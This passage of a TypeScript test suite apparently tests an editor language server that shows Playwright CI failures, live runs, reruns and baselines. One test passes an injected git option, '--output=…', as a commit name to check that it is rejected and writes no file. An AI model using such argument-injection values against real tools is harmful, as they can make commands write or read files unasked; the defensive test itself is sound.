    const spec = (await client.sendRequest('piwi/fileSummary', { uri: uri(rows) })) as FileSummary;
    expect(spec.lines[0]).toMatchObject({ status: 'failed', failure: { state: 'edited' } });
    expect(spec.lines.map((l) => l.title)).toContain(
      "✎ edited since run #41 · locator('.cart-row').nth(2) was not found",
    );
    const hover = (await client.sendRequest('textDocument/hover', {
      textDocument: { uri: uri(page) },
      position: { line: 4, character: 30 },
    })) as { contents: { value: string } };
    expect(hover.contents.value).toContain(
      `**CI failure** · [removes a row](${url}/test-run-cases/900) · run #41 · edited since run #41`,
    );
  });

  test('deleting the test takes its failure away, and putting it back brings it back', async () => {
    const withoutTest = FAILING_SPEC.split('\n').slice(0, 3).join('\n');
    await change(rows, withoutTest, ++version);
    await waitFor(() => (diagnostics.get(uri(page)) && !onPage(() => true) ? true : undefined));
    expect(((await client.sendRequest('piwi/failures')) as FailuresResult).items).toEqual([]);
    expect(failuresChanges[failuresChanges.length - 1]!.items).toEqual([]);

    await change(rows, FAILING_SPEC, ++version);
    expect(await waitFor(() => onPage(() => true))).toMatchObject({ severity: 3 });
  });

  test('a run without a commit is followed from its file as saved when its failure was first placed', async () => {
    await change(page, PAGE_OBJECT, ++version);
    laidOver = {
      run: { ...MAIN_RUN, origin: 'ci' },
      overlays: [],
      failures: [{ ...ROW_FAILURE, executionId: 901 }],
      resolved: [],
    };
    await client.sendRequest('piwi/refreshRun');
    const placed = await waitFor(() => onPage((d) => d.message.includes('run #41')));
    expect(lineOf(placed)).toBe(4);
    await change(page, `// The cart.\n${PAGE_OBJECT}`, ++version);
    const moved = await waitFor(() => onPage((d) => lineOf(d) === 5));
    expect(moved).toMatchObject({ severity: 1, codeDescription: { href: `${url}/test-run-cases/901` } });
  });

  test('a CI run is followed from its commit: lines saved above its failure since move it', async () => {
    const saved = PAGE_OBJECT.replace('export class', '// The cart.\n// Its rows.\nexport class');
    const file = path.join(dir, page);
    fs.writeFileSync(file, saved);
    await change(page, saved, ++version);
    laidOver = {
      run: { ...MAIN_RUN, origin: 'ci', commit: fixtureCommit },
      overlays: [],
      failures: [{ ...ROW_FAILURE, executionId: 903 }],
      resolved: [],
    };
    try {
      await client.sendRequest('piwi/refreshRun');
      // Placed from the file as saved until the commit's file is read, then from it.
      const placed = await waitFor(() =>
        onPage((d) => (d.data as { executionId: number }).executionId === 903 && lineOf(d) === 6),
      );
      expect(placed).toMatchObject({
        severity: 1,
        message: "locator('.cart-row').nth(2) was not found (removes a row, run #41)",
        range: { start: { line: 6, character: 2 } },
      });
    } finally {
      fs.writeFileSync(file, PAGE_OBJECT);
    }
  });

  test('a file is read at a commit by its object name only', async () => {
    expect(await committedTextAt(dir, fixtureCommit, page)).toBe(PAGE_OBJECT);
    expect(await committedTextAt(dir, fixtureCommit.slice(0, 7), page)).toBe(PAGE_OBJECT);
    expect(await committedTextAt(dir, 'a1b2c3d', page)).toBeNull();
    const written = path.join(dir, 'from-git');
    expect(await committedTextAt(dir, `--output=${written}`, page)).toBeNull();
    expect(fs.readdirSync(dir).filter((f) => f.startsWith('from-git'))).toEqual([]);
  });

  test('a run on this machine is followed from its files as saved, not from its commit', async () => {
    // Two lines above the row's locator, saved but not committed, ran with the run, which failed there.
    const saved = PAGE_OBJECT.replace('export class', '// The cart.\n// Its rows.\nexport class');
    const file = path.join(dir, page);
    fs.writeFileSync(file, saved);
    await change(page, saved, ++version);
    laidOver = {
      run: { ...MAIN_RUN, origin: 'ci', commit: fixtureCommit },
      overlays: [
        {
          id: 42,
          status: 'failed',
          origin: 'editor',
          isFullRun: false,
          startTime: '2026-09-27T10:30:00.000Z',
          commit: fixtureCommit,
          totalTests: 1,
          passedTests: 0,
          failedTests: 1,
          flakyTests: 0,
          skippedTests: 0,
        },
      ],
      failures: [
        {
          ...ROW_FAILURE,
          executionId: 952,
          location: '/home/dev/shop/tests/pages/checkout.page.ts:7:21',
          frames: ['/home/dev/shop/tests/pages/checkout.page.ts:7:21', '/home/dev/shop/tests/rows.spec.ts:7:18'],
          source: 'overlay',
          runId: 42,
        },
      ],
      resolved: [],
    };
    try {
      await client.sendRequest('piwi/refreshRun');
      const local = await waitFor(() => onPage((d) => d.message.includes('local run #42')));
      expect(local).toMatchObject({
        severity: 1,
        message: "locator('.cart-row').nth(2) was not found (removes a row, local run #42)",
        range: { start: { line: 6, character: 2 } },
      });
    } finally {
      fs.writeFileSync(file, PAGE_OBJECT);
    }
  });
});

describe('runs as they happen', () => {
  let runsClient: MessageConnection;
  let stopRuns: () => void;
  const statuses: RunStatusResult[] = [];
  const notices: Notice[] = [];
  const verdicts: RunEnded[] = [];
  const published = new Map<string, Array<{ message: string; code?: string }>>();

  beforeAll(async () => {
    const toServer = new PassThrough();
    const toClient = new PassThrough();
    stopRuns = startServer(createConnection(toServer, toClient), {
      env: {
        PIWI_DASHBOARD_URL: url,
        PIWI_PROJECT_NAME: 'Acme Mugs',
        PIWI_API_KEY: RUNS_KEY,
        PIWI_DESKTOP_CONFIG: '/nonexistent',
      },
      debounceMs: 10,
      // Not within a test: what the service reads again, it reads on an event.
      runPollMs: 60 * 60_000,
      // Ten times that while the instance's stream is connected, as it is here.
      ownRunPollMs: 50,
      commandEndWaitMs: 300,
    });
    runsClient = createMessageConnection(new StreamMessageReader(toClient), new StreamMessageWriter(toServer));
    runsClient.onNotification('piwi/runStatusChanged', (p: RunStatusResult) => {
      statuses.push(p);
    });
    runsClient.onNotification('piwi/notice', (n: Notice) => {
      notices.push(n);
    });
    runsClient.onNotification('piwi/runEnded', (v: RunEnded) => {
      verdicts.push(v);
    });
    runsClient.onNotification('textDocument/publishDiagnostics', (p: { uri: string; diagnostics: [] }) => {
      published.set(p.uri, p.diagnostics);
    });
    runsClient.listen();
    await runsClient.sendRequest('initialize', {
      processId: null,
      rootUri: null,
      capabilities: {},
      workspaceFolders: [{ uri: pathToFileURL(dir).href, name: 'shop' }],
    });
    await runsClient.sendNotification('initialized', {});
    await waitFor(async () => {
      const s = (await runsClient.sendRequest('piwi/runStatus')) as RunStatusResult;
      return s.contexts[0]?.run && s.contexts[0].stream === 'live' ? s : undefined;
    });
  });

  afterAll(() => {
    stopRuns?.();
    runsClient?.dispose();
    runsLaidOver = null;
  });

  test('a run that ends is read within a second, without waiting for the next read', async () => {
    const before = runsReads;
    pushInstanceEvent({ type: 'run-finished', runId: 50, projectId: 8, status: 'passed' });
    const at = Date.now();
    pushInstanceEvent({ type: 'run-finished', runId: 51, projectId: 7, status: 'passed' });
    await waitFor(() => (runsReads > before ? true : undefined), 1_000);
    expect(Date.now() - at).toBeLessThan(1_000);
    expect(statuses[statuses.length - 1]?.contexts[0]).toMatchObject({ stream: 'live', live: null });
  });

  /** A run of a command built here with `ref`, as `GET /api/test-runs/:id` answers it: on another branch than main. */
  const editorRun = (id: number, ref: string | undefined, status: string, startTime: string) => ({
    id,
    status,
    branch: 'feature/other',
    startTime,
    metadata: { piwiOrigin: { kind: 'editor', ref } },
    totalTests: 2,
    passedTests: status === 'running' ? 0 : 1,
    failedTests: status === 'failed' ? 1 : 0,
    skippedTests: 0,
    didNotRunTests: 0,
  });

  /** What the instance answers once run `id` is laid over run #41, `pays` failing in it. */
  const laidOverBy = (id: number, startTime: string) => ({
    run: { ...MAIN_RUN, origin: 'ci' },
    overlays: [
      {
        id,
        status: 'failed',
        origin: 'editor',
        isFullRun: false,
        startTime,
        commit: null,
        totalTests: 2,
        passedTests: 1,
        failedTests: 1,
        flakyTests: 0,
        skippedTests: 0,
      },
    ],
    failures: [
      ROW_FAILURE,
      {
        executionId: 900 + id,
        testCaseId: 1,
        clusterId: null,
        title: 'pays',
        file: 'tests/checkout.spec.ts',
        line: 3,
        status: 'failed',
        headline: "getByRole('button', { name: 'Pay now' }) was not visible",
        location: '/home/dev/shop/tests/pages/checkout.page.ts:4:21',
        message: null,
        frames: ['/home/dev/shop/tests/pages/checkout.page.ts:4:21'],
        traces: [],
        screenshot: null,
        source: 'overlay',
        runId: id,
        browserName: 'chromium',
      },
    ],
    resolved: [],
  });

  /** The run ends, `pays` failing in it: the failure on the page object names it. */
  async function endRun(id: number, startTime: string) {
    runDetails.set(id, { ...runDetails.get(id), status: 'failed', passedTests: 1, failedTests: 1 });
    runsLaidOver = laidOverBy(id, startTime);
    const seen = statuses.length;
    pushRunEvent(id, 'run-finished', { status: 'failed', totalTests: 2, passedTests: 1, failedTests: 1 });
    pushInstanceEvent({ type: 'run-finished', runId: id, projectId: 7, status: 'failed' });
    const ended = await waitFor(() => statuses.slice(seen).find((s) => s.contexts[0]?.live === null));
    const onPage = await waitFor(() =>
      published.get(uri('tests/pages/checkout.page.ts'))?.find((d) => d.message.includes(`your run #${id}`)),
    );
    return { ended, message: onPage.message };
  }

  const runTests = async () =>
    (await runsClient.sendRequest('piwi/runArgs', { uri: uri('tests/checkout.spec.ts'), testIds: [1] })) as RunCommand;

  test('the run of a test started here is followed live as its own, and its failures read your run', async () => {
    const command = await runTests();
    expect(command.ref).toMatch(/^ed-[0-9a-f]{8}$/);
    expect(command.env).toEqual({ PIWI_ORIGIN: 'editor', PIWI_ORIGIN_REF: command.ref });

    // It runs on another branch than the one read: the editor's own run is followed wherever it runs.
    const startTime = '2026-09-27T11:00:00.000Z';
    runDetails.set(42, editorRun(42, command.ref, 'running', startTime));
    refRuns.set(command.ref!, { id: 42, status: 'running' });
    const started = await waitFor(() => statuses.find((s) => s.contexts[0]?.live)?.contexts[0]?.live ?? undefined);
    expect(started).toEqual({
      runId: 42,
      status: 'running',
      done: 0,
      total: 2,
      failed: 0,
      startedAt: startTime,
      own: true,
    });

    // A test's end, then the counts of its batch.
    await waitFor(() => (runStreams.get(42)?.size ? true : undefined));
    pushRunEvent(42, 'test-completed', { title: 'pays', status: 'failed', testCaseId: 1 });
    pushRunEvent(42, 'run-progress', { totalTests: 2, passedTests: 0, failedTests: 1, skippedTests: 0 });
    const progress = await waitFor(
      () => statuses.find((s) => s.contexts[0]?.live?.done === 1)?.contexts[0]?.live ?? undefined,
    );
    expect(progress).toMatchObject({ runId: 42, done: 1, total: 2, failed: 1, own: true });

    // It ends: the instance lays it over run #41.
    const { ended, message } = await endRun(42, startTime);
    // The live run leaves in the notification that brings the failures read once it ended.
    expect(ended.contexts[0]).toMatchObject({ live: null, overlays: 1, failingTests: 2 });
    expect(message).toBe("getByRole('button', { name: 'Pay now' }) was not visible (pays, your run #42)");
    const listed = (await runsClient.sendRequest('piwi/failures')) as FailuresResult;
    expect(listed.items.find((i) => i.runId === 42)).toMatchObject({ source: 'own', state: 'failing' });
  });

  test('a rerun of a command started here, with the same ref, is its own once the stream announces it', async () => {
    const command = await runTests();
    const ref = command.ref!;
    const noticed = notices.length;
    // The command's run, found on the instance.
    runDetails.set(45, editorRun(45, ref, 'passed', '2026-09-27T12:30:00.000Z'));
    refRuns.set(ref, { id: 45, status: 'passed' });
    let reads = runsReads;
    await waitFor(() => (runsReads > reads ? true : undefined));

    /** A run of the same command, with the same ref, that the stream announces: the editor's own. */
    const rerun = async (id: number, startTime: string) => {
      runDetails.set(id, editorRun(id, ref, 'running', startTime));
      const seen = statuses.length;
      pushInstanceEvent({ type: 'run-started', runId: id, projectId: 7 });
      const live = await waitFor(
        () => statuses.slice(seen).find((s) => s.contexts[0]?.live?.runId === id)?.contexts[0]?.live ?? undefined,
      );
      expect(live).toMatchObject({ runId: id, status: 'running', own: true });
      const { message } = await endRun(id, startTime);
      expect(message).toBe(`getByRole('button', { name: 'Pay now' }) was not visible (pays, your run #${id})`);
    };
    // Before the command's end is heard of, as in a terminal reused without shell integration.
    await rerun(46, '2026-09-27T12:40:00.000Z');
    // After it, as the Run tool window's Rerun does.
    reads = runsReads;
    await runsClient.sendNotification('piwi/commandEnded', { ref, exitCode: 1 });
    await waitFor(() => (runsReads > reads ? true : undefined));
    await rerun(47, '2026-09-27T12:50:00.000Z');
    expect(notices.length).toBe(noticed);
  });

  test('a command sent to a terminal of another ref is not looked for, and its run is its own by that ref', async () => {
    // A terminal opened for a first command, then reused for a second one: its runs carry the first ref.
    const first = await runTests();
    await runsClient.sendNotification('piwi/commandStarted', { ref: first.ref });
    const second = await runTests();
    await runsClient.sendNotification('piwi/commandStarted', { ref: second.ref, terminalRef: first.ref });
    const startTime = '2026-09-27T13:00:00.000Z';
    runDetails.set(48, editorRun(48, first.ref, 'running', startTime));
    const seen = statuses.length;
    pushInstanceEvent({ type: 'run-started', runId: 48, projectId: 7 });
    const live = await waitFor(
      () => statuses.slice(seen).find((s) => s.contexts[0]?.live?.runId === 48)?.contexts[0]?.live ?? undefined,
    );
    expect(live).toMatchObject({ runId: 48, status: 'running', own: true });
    const { message } = await endRun(48, startTime);
    expect(message).toBe("getByRole('button', { name: 'Pay now' }) was not visible (pays, your run #48)");
    // The instance was never asked for the ref the second command was built with.
    expect(refLookups.get(second.ref!)).toBeUndefined();
  });

  test('a command whose run never reached the instance is said once it ends, and is looked for no more', async () => {
    const reached = await runTests();
    const lost = await runTests();
    runDetails.set(43, editorRun(43, reached.ref, 'passed', '2026-09-27T12:00:00.000Z'));
    refRuns.set(reached.ref!, { id: 43, status: 'passed' });
    await runsClient.sendNotification('piwi/commandEnded', { ref: reached.ref, exitCode: 0 });
    await runsClient.sendNotification('piwi/commandEnded', { ref: lost.ref, exitCode: 1 });
    await waitFor(() => notices[0]);
    expect(notices).toEqual([
      {
        root: dir,
        severity: 'warning',
        message: `The run ended (exit code 1) but did not reach ${url}: is the Piwi reporter in the Playwright config?`,
      },
    ]);
    // Once the wait is over, the instance is not asked for either command's run again.
    const asked = [refLookups.get(reached.ref!), refLookups.get(lost.ref!)];
    await new Promise((resolve) => setTimeout(resolve, 400));
    expect([refLookups.get(reached.ref!), refLookups.get(lost.ref!)]).toEqual(asked);
    expect(asked[1]).toBeGreaterThan(0);
  });

  /** A test of `pays`'s spec failing in run `runId`, laid over run #41. */
  const paysFailure = (executionId: number, testCaseId: number, title: string, runId: number, isNew: boolean) => ({
    executionId,
    testCaseId,
    clusterId: null,
    title,
    file: 'tests/checkout.spec.ts',
    line: 3,
    status: 'failed',
    headline: 'Failed',
    location: null,
    message: null,
    frames: [],
    traces: [],
    screenshot: null,
    source: runId === 41 ? 'baseline' : 'overlay',
    runId,
    browserName: 'chromium',
    isNew,
  });

  test('the tests of the editor’s own run show as running, then with their result, until the run is read', async () => {
    const command = await runTests();
    const startTime = '2026-09-27T14:00:00.000Z';
    runDetails.set(60, editorRun(60, command.ref, 'running', startTime));
    refRuns.set(command.ref!, { id: 60, status: 'running' });
    await waitFor(() => statuses.find((s) => s.contexts[0]?.live?.runId === 60));
    await waitFor(() => (runStreams.get(60)?.size ? true : undefined));
    const testLine = async () => {
      const summary = (await runsClient.sendRequest('piwi/fileSummary', {
        uri: uri('tests/checkout.spec.ts'),
      })) as FileSummary;
      return summary.lines.find((l) => l.status !== undefined);
    };

    // A test begins, named by its title in its spec.
    const before = statuses.length;
    pushRunEvent(60, 'test-begin', { title: 'pays', filePath: 'tests/checkout.spec.ts', browser: 'chromium' });
    const began = await waitFor(
      () => statuses.slice(before).find((s) => s.contexts[0]?.liveTests?.length)?.contexts[0],
    );
    expect(began.liveTests).toEqual([{ testCaseId: 1, status: 'running' }]);
    expect(await testLine()).toMatchObject({ line: 2, status: 'running' });

    // It passes on its second attempt: flaky.
    pushRunEvent(60, 'test-completed', {
      title: 'pays',
      filePath: 'tests/checkout.spec.ts',
      testCaseId: 1,
      status: 'passed',
      retries: 1,
      browser: 'chromium',
    });
    await waitFor(() =>
      statuses[statuses.length - 1]?.contexts[0]?.liveTests?.[0]?.status === 'flaky' ? true : undefined,
    );
    expect(await testLine()).toMatchObject({ status: 'flaky' });

    // The run ends and is read: the test shows the latest run's result again.
    runDetails.set(60, { ...runDetails.get(60), status: 'passed', passedTests: 2 });
    const seen = statuses.length;
    pushRunEvent(60, 'run-finished', { status: 'passed', totalTests: 2, passedTests: 2, failedTests: 0 });
    const ended = await waitFor(() => statuses.slice(seen).find((s) => s.contexts[0]?.live === null));
    expect(ended.contexts[0]!.liveTests).toBeUndefined();
    expect((await testLine())?.status).not.toBe('flaky');
  });

  test('a run started here says what it changed once it ended and was read', async () => {
    // Before it: run #41 fails `removes a row` and `pays`.
    runsLaidOver = {
      run: { ...MAIN_RUN, origin: 'ci' },
      overlays: [],
      failures: [ROW_FAILURE, paysFailure(960, 1, 'pays', 41, false)],
      resolved: [],
    };
    await runsClient.sendRequest('piwi/refreshRun');
    const command = await runTests();
    const startTime = '2026-09-27T15:00:00.000Z';
    runDetails.set(61, editorRun(61, command.ref, 'running', startTime));
    refRuns.set(command.ref!, { id: 61, status: 'running' });
    await waitFor(() => statuses.find((s) => s.contexts[0]?.live?.runId === 61));

    // It passes `removes a row`, fails `pays` again, and fails `pays by card`, which passed in run #41.
    runDetails.set(61, { ...runDetails.get(61), status: 'failed', passedTests: 1, failedTests: 2 });
    runsLaidOver = {
      run: { ...MAIN_RUN, origin: 'ci' },
      overlays: [
        {
          id: 61,
          status: 'failed',
          origin: 'editor',
          isFullRun: false,
          startTime,
          commit: null,
          totalTests: 3,
          passedTests: 1,
          failedTests: 2,
          flakyTests: 0,
          skippedTests: 0,
        },
      ],
      failures: [paysFailure(1061, 1, 'pays', 61, false), paysFailure(1062, 2, 'pays by card', 61, true)],
      resolved: [
        {
          testCaseId: 3,
          title: 'removes a row',
          file: 'tests/rows.spec.ts',
          line: 4,
          browserName: 'chromium',
          runId: 61,
          executionId: 1063,
          baselineExecutionId: 900,
        },
      ],
    };
    pushInstanceEvent({ type: 'run-finished', runId: 61, projectId: 7, status: 'failed' });
    const verdict = await waitFor(() => verdicts.find((v) => v.runId === 61));
    expect(verdict).toEqual({
      root: dir,
      runId: 61,
      url: `${url}/test-runs/61`,
      passed: 1,
      failed: 2,
      flaky: 0,
      skipped: 0,
      fixed: 1,
      stillFailing: ['checkout.spec.ts › pays'],
      newFailures: ['checkout.spec.ts › pays by card'],
      stillFailingCount: 1,
      newFailureCount: 1,
    });
    // Said once, whatever else reads the run again.
    await runsClient.sendRequest('piwi/refreshRun');
    pushInstanceEvent({ type: 'run-finished', runId: 61, projectId: 7, status: 'failed' });
    await new Promise((resolve) => setTimeout(resolve, 800));
    expect(verdicts.filter((v) => v.runId === 61)).toHaveLength(1);
  });

  /** The command that runs `pays` three times, by its location. */
  const verifyPays = async () =>
    (await runsClient.sendRequest('piwi/runArgs', {
      uri: uri('tests/checkout.spec.ts'),
      testIds: [],
      locations: ['tests/checkout.spec.ts:3'],
      repeat: 3,
    })) as RunCommand;

  test('a run of a test three times says how many of its runs passed, counted from its stream', async () => {
    const command = await verifyPays();
    expect(command.command).toBe('npx playwright test tests/checkout.spec.ts:3 --repeat-each=3 --retries=0');
    expect(command.env).toEqual({ PIWI_ORIGIN: 'editor', PIWI_ORIGIN_REF: command.ref });
    const startTime = '2026-09-27T16:00:00.000Z';
    runDetails.set(62, editorRun(62, command.ref, 'running', startTime));
    refRuns.set(command.ref!, { id: 62, status: 'running' });
    await waitFor(() => statuses.find((s) => s.contexts[0]?.live?.runId === 62));
    await waitFor(() => (runStreams.get(62)?.size ? true : undefined));

    // The stream brings each of the three runs, and a catch-up sends one again.
    const result = (status: string, executionId: number, repeatEachIndex: number) => ({
      title: 'pays',
      filePath: 'tests/checkout.spec.ts',
      testCaseId: 1,
      status,
      retries: 0,
      repeatEachIndex,
      browser: 'chromium',
      executionId,
    });
    pushRunEvent(62, 'test-completed', result('passed', 1201, 0));
    pushRunEvent(62, 'test-completed', result('failed', 1202, 1));
    pushRunEvent(62, 'test-completed', result('passed', 1203, 2));
    pushRunEvent(62, 'test-completed', result('passed', 1201, 0));
    runDetails.set(62, { ...runDetails.get(62), status: 'failed', totalTests: 3, passedTests: 2, failedTests: 1 });
    pushRunEvent(62, 'run-finished', { status: 'failed', totalTests: 3, passedTests: 2, failedTests: 1 });
    pushInstanceEvent({ type: 'run-finished', runId: 62, projectId: 7, status: 'failed' });
    const verdict = await waitFor(() => verdicts.find((v) => v.runId === 62));
    expect(verdict).toMatchObject({ runId: 62, failed: 1, repeat: { verdict: 'Failed 1 of 3', failed: true } });

    // A run of each test once says what it changed alone.
    expect(verdicts.find((v) => v.runId === 61)?.repeat).toBeUndefined();
  });

  test('a run of a test three times that reached no instance says from its exit code how it went', async () => {
    const command = await verifyPays();
    const seen = notices.length;
    await runsClient.sendNotification('piwi/commandEnded', { ref: command.ref, exitCode: 0 });
    await waitFor(() => (notices.length >= seen + 2 ? true : undefined));
    expect(notices.slice(seen)).toEqual([
      {
        root: dir,
        severity: 'warning',
        message: `The run ended (exit code 0) but did not reach ${url}: is the Piwi reporter in the Playwright config?`,
      },
      { root: dir, severity: 'information', message: 'Passed 3 of 3: tests/checkout.spec.ts:3' },
    ]);
  });

  test('piwi/refreshRun reads the latest run again and answers the status', async () => {
    const before = (await runsClient.sendRequest('piwi/runStatus')) as RunStatusResult;
    await new Promise((resolve) => setTimeout(resolve, 5));
    const reads = runsReads;
    const after = (await runsClient.sendRequest('piwi/refreshRun')) as RunStatusResult;
    expect(runsReads).toBeGreaterThan(reads);
    expect(after.contexts[0]).toMatchObject({ run: { id: 41 }, stream: 'live', live: null });
    expect(Date.parse(after.contexts[0]!.updatedAt!)).toBeGreaterThan(Date.parse(before.contexts[0]!.updatedAt!));
    expect(await runsClient.sendRequest('piwi/runStatus')).toEqual(after);
  });

  test('a command’s run is looked for seldom while the stream is connected, and every poll while it is down', async () => {
    const at = Date.now();
    const command = await runTests();
    const ref = command.ref!;
    // The stream announces the run: the instance is asked for it ten polls apart.
    await new Promise((resolve) => setTimeout(resolve, 250));
    expect(refLookups.get(ref)).toBeUndefined();
    await waitFor(() => refLookups.get(ref));
    expect(Date.now() - at).toBeGreaterThanOrEqual(450);
    // The stream drops: every poll, until it is open again.
    for (const res of instanceStreams) res.end();
    await waitFor(async () => {
      const s = (await runsClient.sendRequest('piwi/runStatus')) as RunStatusResult;
      return s.contexts[0]?.stream === 'polling' ? true : undefined;
    });
    const asked = refLookups.get(ref)!;
    await new Promise((resolve) => setTimeout(resolve, 400));
    expect(refLookups.get(ref)!).toBeGreaterThanOrEqual(asked + 3);
    await waitFor(async () => {
      const s = (await runsClient.sendRequest('piwi/runStatus')) as RunStatusResult;
      return s.contexts[0]?.stream === 'live' ? true : undefined;
    });
  });
});

describe('a live run whose stream closed', () => {
  test('is read again within the active interval while the instance’s stream is connected', async () => {
    const toServer = new PassThrough();
    const toClient = new PassThrough();
    const stopLive = startServer(createConnection(toServer, toClient), {
      env: {
        PIWI_DASHBOARD_URL: url,
        PIWI_PROJECT_NAME: 'Acme Mugs',
        PIWI_API_KEY: RUNS_KEY,
        PIWI_DESKTOP_CONFIG: '/nonexistent',
      },
      debounceMs: 10,
      // A run in progress is read every 100 ms; with the stream connected, the latest run every 2 s.
      runPollMs: 400,
    });
    const liveClient = createMessageConnection(new StreamMessageReader(toClient), new StreamMessageWriter(toServer));
    const statuses: RunStatusResult[] = [];
    liveClient.onNotification('piwi/runStatusChanged', (p: RunStatusResult) => {
      statuses.push(p);
    });
    liveClient.listen();
    try {
      await liveClient.sendRequest('initialize', {
        processId: null,
        rootUri: null,
        capabilities: {},
        workspaceFolders: [{ uri: pathToFileURL(dir).href, name: 'shop' }],
      });
      await liveClient.sendNotification('initialized', {});
      await waitFor(async () => {
        const s = (await liveClient.sendRequest('piwi/runStatus')) as RunStatusResult;
        return s.contexts[0]?.run && s.contexts[0].stream === 'live' ? s : undefined;
      });

      // A run on the branch starts; its own stream answers 404, and is not opened again.
      const run = {
        id: 70,
        status: 'running',
        branch: 'main',
        startTime: '2026-09-27T13:00:00.000Z',
        metadata: {},
        totalTests: 2,
        passedTests: 0,
        failedTests: 0,
        skippedTests: 0,
        didNotRunTests: 0,
      };
      goneRunStreams.set(70, 0);
      runDetails.set(70, run);
      pushInstanceEvent({ type: 'run-started', runId: 70, projectId: 7 });
      await waitFor(() => (statuses.some((s) => s.contexts[0]?.live?.runId === 70) ? true : undefined));
      await waitFor(() => (goneRunStreams.get(70) ? true : undefined));

      // It ends without a word from either stream, just after a read.
      const reads = runsReads;
      await waitFor(() => (runsReads > reads ? true : undefined), 3_000);
      const seen = statuses.length;
      runDetails.set(70, { ...run, status: 'passed', passedTests: 2 });
      const at = Date.now();
      const ended = await waitFor(() => statuses.slice(seen).find((s) => s.contexts[0]?.live === null), 3_000);
      expect(Date.now() - at).toBeLessThan(1_000);
      expect(ended.contexts[0]).toMatchObject({ stream: 'live', live: null });
    } finally {
      stopLive();
      liveClient.dispose();
      goneRunStreams.delete(70);
      runDetails.delete(70);
    }
  });
});

describe('the desktop app', () => {
  test('is picked up when it starts, with the project linked to the folder, and offered to Connect', async () => {
    const desktopFile = path.join(dir, '.desktop.json');
    const toServer = new PassThrough();
    const toClient = new PassThrough();
    const stopDesktop = startServer(createConnection(toServer, toClient), {
      env: { PIWI_DESKTOP_CONFIG: desktopFile },
      debounceMs: 10,
      desktopWatchMs: 20,
    });
    const desktopClient = createMessageConnection(new StreamMessageReader(toClient), new StreamMessageWriter(toServer));
    desktopClient.listen();
    try {
      await desktopClient.sendRequest('initialize', {
        processId: null,
        rootUri: null,
        capabilities: {},
        workspaceFolders: [{ uri: pathToFileURL(dir).href, name: 'shop' }],
      });
      await desktopClient.sendNotification('initialized', {});
      const before = await waitFor(async () => {
        const s = (await desktopClient.sendRequest('piwi/status')) as StatusResult;
        return s.contexts[0]?.problem ? s : undefined;
      });
      expect(before.contexts[0]).toMatchObject({ connected: false, source: null });
      expect(await desktopClient.sendRequest('piwi/desktop')).toEqual({ url: null, projects: [], linked: null });

      fs.writeFileSync(desktopFile, JSON.stringify({ url, token: 'pd_desktop', projects: [{ id: 7, path: dir }] }));
      const after = await waitFor(async () => {
        const s = (await desktopClient.sendRequest('piwi/status')) as StatusResult;
        return s.contexts[0]?.connected ? s : undefined;
      });
      expect(after.contexts[0]).toMatchObject({ source: 'desktop', projectName: 'Acme Mugs', serverUrl: url });
      expect(await desktopClient.sendRequest('piwi/desktop')).toEqual({
        url,
        projects: [{ id: 7, name: 'Acme Mugs' }],
        linked: { id: 7, name: 'Acme Mugs' },
      });
    } finally {
      fs.rmSync(desktopFile, { force: true });
      stopDesktop();
      desktopClient.dispose();
    }
  });
});

describe('the folder a command runs in', () => {
  test('is the config folder as the file system spells it, whatever spelling the editor gave', async () => {
    // A link stands for another spelling of the same folder, as `c:\…` for `C:\…` on Windows.
    const linked = path.join(os.tmpdir(), `piwi-linked-${process.pid}`);
    fs.rmSync(linked, { force: true });
    fs.symlinkSync(dir, linked, 'dir');
    const toServer = new PassThrough();
    const toClient = new PassThrough();
    const stopLinked = startServer(createConnection(toServer, toClient), {
      env: { PIWI_DASHBOARD_URL: url, PIWI_PROJECT_NAME: 'Acme Mugs', PIWI_DESKTOP_CONFIG: '/nonexistent' },
      debounceMs: 10,
    });
    const linkedClient = createMessageConnection(new StreamMessageReader(toClient), new StreamMessageWriter(toServer));
    linkedClient.listen();
    try {
      await linkedClient.sendRequest('initialize', {
        processId: null,
        rootUri: null,
        capabilities: {},
        workspaceFolders: [{ uri: pathToFileURL(linked).href, name: 'shop' }],
      });
      await linkedClient.sendNotification('initialized', {});
      await waitFor(async () => {
        const s = (await linkedClient.sendRequest('piwi/status')) as StatusResult;
        return s.contexts[0]?.connected ? s : undefined;
      });
      const spec = pathToFileURL(path.join(linked, 'tests/checkout.spec.ts')).href;
      const command = (await linkedClient.sendRequest('piwi/runArgs', {
        uri: spec,
        testIds: [1],
        breakpoints: [{ uri: spec, line: 2 }],
      })) as RunCommand;
      expect(command.cwd).toBe(fs.realpathSync.native(dir));
      expect(command.env).toMatchObject({ PIWI_PAUSE_AT: 'tests/checkout.spec.ts:3' });
    } finally {
      stopLinked();
      linkedClient.dispose();
      fs.rmSync(linked, { force: true });
    }
  });
});

describe('the baseline chosen in the editor', () => {
  let baselineClient: MessageConnection;
  let stopBaseline: () => void;
  const baselinePublished = new Map<string, Array<{ message: string }>>();

  /** The status once its baseline reads `label`. */
  const statusWith = (label: string) =>
    waitFor(async () => {
      const s = (await baselineClient.sendRequest('piwi/runStatus')) as RunStatusResult;
      return s.contexts[0]?.baseline?.label === label ? s.contexts[0] : undefined;
    });

  /** Choose a baseline, and the status once it reads `label`, with the queries read meanwhile. */
  const choose = async (choice: unknown, label: string) => {
    const from = baselineReads.length;
    await baselineClient.sendNotification('piwi/setBaseline', { root: dir, choice });
    const status = await statusWith(label);
    return { status, reads: baselineReads.slice(from).map((q) => Object.fromEntries(q)) };
  };

  beforeAll(async () => {
    const toServer = new PassThrough();
    const toClient = new PassThrough();
    stopBaseline = startServer(createConnection(toServer, toClient), {
      env: {
        PIWI_DASHBOARD_URL: url,
        PIWI_PROJECT_NAME: 'Acme Mugs',
        PIWI_API_KEY: BASELINE_KEY,
        PIWI_DESKTOP_CONFIG: '/nonexistent',
      },
      debounceMs: 10,
      runPollMs: 60 * 60_000,
    });
    baselineClient = createMessageConnection(new StreamMessageReader(toClient), new StreamMessageWriter(toServer));
    baselineClient.onNotification('textDocument/publishDiagnostics', (p: { uri: string; diagnostics: [] }) => {
      baselinePublished.set(p.uri, p.diagnostics);
    });
    baselineClient.listen();
    // A service started again: the client sends the choice it keeps with the credentials.
    await baselineClient.sendRequest('initialize', {
      processId: null,
      rootUri: null,
      capabilities: {},
      workspaceFolders: [{ uri: pathToFileURL(dir).href, name: 'shop' }],
      initializationOptions: { credentials: { baselines: { [dir]: { kind: 'run', runId: 118 } } } },
    });
    await baselineClient.sendNotification('initialized', {});
  });

  afterAll(() => {
    stopBaseline?.();
    baselineClient?.dispose();
  });

